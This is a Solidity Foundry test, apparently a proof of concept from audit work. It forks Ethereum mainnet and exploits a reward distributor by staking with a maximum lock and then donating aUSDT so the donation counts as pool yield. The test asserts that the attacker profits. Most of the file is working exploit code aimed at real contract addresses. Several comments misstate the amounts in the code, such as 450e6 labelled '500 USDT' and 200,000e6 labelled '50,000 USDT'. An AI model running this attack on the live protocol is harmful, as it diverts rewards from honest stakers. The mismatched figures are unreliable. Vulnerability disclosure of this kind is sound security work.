// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface Vm {
    function createSelectFork(string calldata, uint256) external returns (uint256);
    function warp(uint256) external;
    function roll(uint256) external;
    function startPrank(address) external;
    function stopPrank() external;
    function deal(address, address, uint256) external;
    function deal(address, uint256) external;
    function store(address, bytes32, bytes32) external;
    function mockCall(address, bytes calldata, bytes calldata) external;
    function snapshot() external returns (uint256);
    function revertTo(uint256) external returns (bool);
    function addr(uint256) external returns (address);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

struct PoolInfo {
    address token; string chainLinkPath; uint256 tokenPrice;
    uint256 deposited; uint256 lastUnderlyingBalance; uint8 strategy;
    address aToken; bool isExist;
}

struct UserInfo {
    uint128 lastStake; uint256 deposited; uint256 rate; uint256 pendingRewards;
    uint128 claimLockStart; uint128 claimLockEnd; uint256 virtualDeposited;
    uint128 lastClaim; address referrer;
}

interface IFeed {
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80);
}

interface IDist {
    function distributeRewards(uint256) external;
    function depositPools(uint256, address) external view returns (PoolInfo memory);
    function distributedRewards(uint256, address) external view returns (uint256);
    function minRewardsDistributePeriod() external view returns (uint256);
    function rewardPoolLastCalculatedTimestamp(uint256) external view returns (uint128);
    function supply(uint256, address, uint256) external returns (uint256);
    function aavePoolAddressesProvider() external view returns (address);
}

interface IAavePool {
    function supply(address, uint256, address, uint16) external;
    function getPool() external view returns (address);
}

interface IAaveProvider {
    function getPool() external view returns (address);
}

interface IPool {
    function stake(uint256, uint256, uint128, address) external;
    function getLatestUserReward(uint256, address) external view returns (uint256);
    function usersData(address, uint256) external view returns (UserInfo memory);
}

library L {
    address constant C = 0x000000000000000000636F6e736F6c652e6c6f67;
    function u(string memory s, uint256 v) internal { (bool ok,) = C.call(abi.encodeWithSignature("log(string,uint256)", s, v)); ok; }
}

contract YieldSplitAttackTest {
    Vm constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    address constant DIST   = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant POOL   = 0x3B51989212BEdaB926794D6bf8e9E991218cf116; // USDT deposit pool
    address constant USDT   = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    uint256 constant FORK_BLOCK = 26430567;
    uint256 constant MOR_USD    = 0.70e18;      // stated price; MOR ~= $0.70
    uint256 constant LOCK_END   = 0;            // set in setUp: fork timestamp + 365 days (1.88x, claimable in 1 year)
    uint256 constant DONATION   = 450e6;     // 500 USDT of aUSDT
    uint256 constant STAKE      = 200_000e6;   // 50,000 USDT staked

    address attacker;
    address aUSDT;

    function setUp() public {
        vm.createSelectFork("https://eth.drpc.org", FORK_BLOCK);
        _snapshotFeeds();
        attacker = vm.addr(0xB0B);
        aUSDT = 0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a; // aUSDT, read from depositPools(0, POOL).aToken
        // seed capital: USDT balances live at mapping slot 2 on the TetherToken proxy
        L.u("step1_before_store", 1);
        vm.store(USDT, keccak256(abi.encode(attacker, uint256(2))), bytes32(uint256(200_000e6)));
        L.u("step2_after_store", IERC20(USDT).balanceOf(attacker));
        require(IERC20(USDT).balanceOf(attacker) == 200_000e6, "seed failed");
        L.u("step3_seed_ok", 1);

        vm.startPrank(attacker);
        _approveRaw(USDT, DIST, type(uint256).max);
        // aUSDT balances live at mapping slot 52 as a packed scaled balance (Aave liquidity index > 1e27)
        vm.store(aUSDT, keccak256(abi.encode(attacker, uint256(52))), bytes32(uint256(20_000e6)));
        vm.stopPrank();
        L.u("aUSDT_seeded", IERC20(aUSDT).balanceOf(attacker));
        require(IERC20(aUSDT).balanceOf(attacker) >= DONATION, "no aUSDT");
        require(aUSDT != address(0), "no aToken");
    }

    function _approveRaw(address token, address spender, uint256 amount) internal {
        (bool ok, ) = token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
        require(ok, "approve failed");
    }

    address[6] FEEDS = [
        0xCfE54B5cD566aB89272946F602D76Ea879CAb4a8, // stETH/USD
        0xfdFD9C85aD200c506Cf9e21F1FD8dd01932FBB23, // wBTC/BTC
        0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c, // BTC/USD
        0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419, // wETH/USD
        0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6, // USDC/USD
        0x3E7d1eAB13ad0104d2750B8863b489D65364e32D  // USDT/USD
    ];
    uint256[6] FEED_ANSWERS;

    function _snapshotFeeds() internal {
        for (uint256 i = 0; i < FEEDS.length; i++) {
            (, int256 answer, , , ) = IFeed(FEEDS[i]).latestRoundData();
            FEED_ANSWERS[i] = uint256(answer);
        }
    }

    /// simulate the oracle being fresh at the future timestamp (the feed updates continuously on-chain)
    function _refreshFeeds() internal {
        for (uint256 i = 0; i < FEEDS.length; i++) {
            vm.mockCall(FEEDS[i], abi.encodeWithSignature("latestRoundData()"),
                abi.encode(uint80(1), int256(FEED_ANSWERS[i]), block.timestamp, block.timestamp, uint80(1)));
        }
    }

    function _warpPastPeriod() internal {
        uint128 last = IDist(DIST).rewardPoolLastCalculatedTimestamp(0);
        if (block.timestamp <= uint256(last) + 86400) {
            vm.warp(uint256(last) + 86401);
        }
        _refreshFeeds();
    }

    /// Baseline: one distribution with no donation. Records the organic share for the USDT pool.
    function test_baselineShare() public {
        _warpPastPeriod();
        uint256 before = IDist(DIST).distributedRewards(0, POOL);
        IDist(DIST).distributeRewards(0);
        uint256 delta = IDist(DIST).distributedRewards(0, POOL) - before;
        L.u("baseline_usdt_pool_MOR_wei", delta);
        L.u("baseline_usd", (delta * MOR_USD) / 1e36);
        require(delta > 0, "no organic yield");
        require((delta * MOR_USD) / 1e36 < 100e18, "baseline unexpectedly large");
    }

    /// Control: the same donation, with no stake in the pool, pays the attacker nothing.
    /// This separates our trigger (third-party transfer) from issue #64 (two pools sharing one token).
    function test_control_noStakeNoProfit() public {
        uint256 snap = vm.snapshot();
        _warpPastPeriod();
        uint256 c0 = IDist(DIST).distributedRewards(0, POOL);
        IDist(DIST).distributeRewards(0);
        uint256 control = IDist(DIST).distributedRewards(0, POOL) - c0;
        vm.revertTo(snap);

        _warpPastPeriod();
        vm.startPrank(attacker);
        IERC20(aUSDT).transfer(DIST, DONATION);
        vm.stopPrank();

        uint256 a0 = IDist(DIST).distributedRewards(0, POOL);
        IDist(DIST).distributeRewards(0);
        uint256 attack = IDist(DIST).distributedRewards(0, POOL) - a0;

        vm.warp(block.timestamp + 15 days);
        uint256 claimable = IPool(POOL).getLatestUserReward(0, attacker);

        L.u("control_noStake_pool_MOR", attack);
        L.u("control_noStake_attacker_claimable", claimable);
        require(attack > control * 5, "pool share not bent");
        require(claimable == 0, "attacker with no stake should get nothing");
    }

    /// Attack: dominate a small pool with a max lock multiplier, then donate aToken to bend the split.
    function test_yieldSplitAttack() public {
        uint256 snap = vm.snapshot();

        // ---- control: distribution without donation
        _warpPastPeriod();
        uint256 c0 = IDist(DIST).distributedRewards(0, POOL);
        IDist(DIST).distributeRewards(0);
        uint256 control = IDist(DIST).distributedRewards(0, POOL) - c0;
        vm.revertTo(snap);

        // ---- attack
        vm.startPrank(attacker);
        uint128 lockEnd = uint128(block.timestamp + 365 days);
        IPool(POOL).stake(0, STAKE, lockEnd, address(0));
        vm.stopPrank();

        UserInfo memory ui = IPool(POOL).usersData(attacker, 0);
        L.u("attacker_deposited", ui.deposited);
        L.u("attacker_virtual", ui.virtualDeposited);

        // donate aTokens directly to the Distributor right before the period closes
        _warpPastPeriod();
        vm.startPrank(attacker);
        IERC20(aUSDT).transfer(DIST, DONATION);
        vm.stopPrank();

        uint256 a0 = IDist(DIST).distributedRewards(0, POOL);
        IDist(DIST).distributeRewards(0);
        uint256 attack = IDist(DIST).distributedRewards(0, POOL) - a0;

        L.u("control_MOR_wei", control);
        L.u("attack_MOR_wei", attack);
        L.u("extra_MOR_wei", attack - control);
        L.u("extra_usd", ((attack - control) * MOR_USD) / 1e36);
        L.u("donation_usd", DONATION * 1e12);

        // the pool's allocation must jump because the donation was counted as yield
        require(attack > control * 5, "split not bent");

        // attacker's own claimable reward must be worth more than the donation
        vm.warp(block.timestamp + 366 days);
        uint256 claimable = IPool(POOL).getLatestUserReward(0, attacker);
        L.u("attacker_claimable_MOR_wei", claimable);
        L.u("attacker_claimable_usd", (claimable * MOR_USD) / 1e36);
        uint256 claimable_usd = (claimable * MOR_USD) / 1e18;
        require(claimable_usd > DONATION * 1e12, "not profitable");
        L.u("net_profit_usd", claimable_usd - DONATION * 1e12);
    }
}
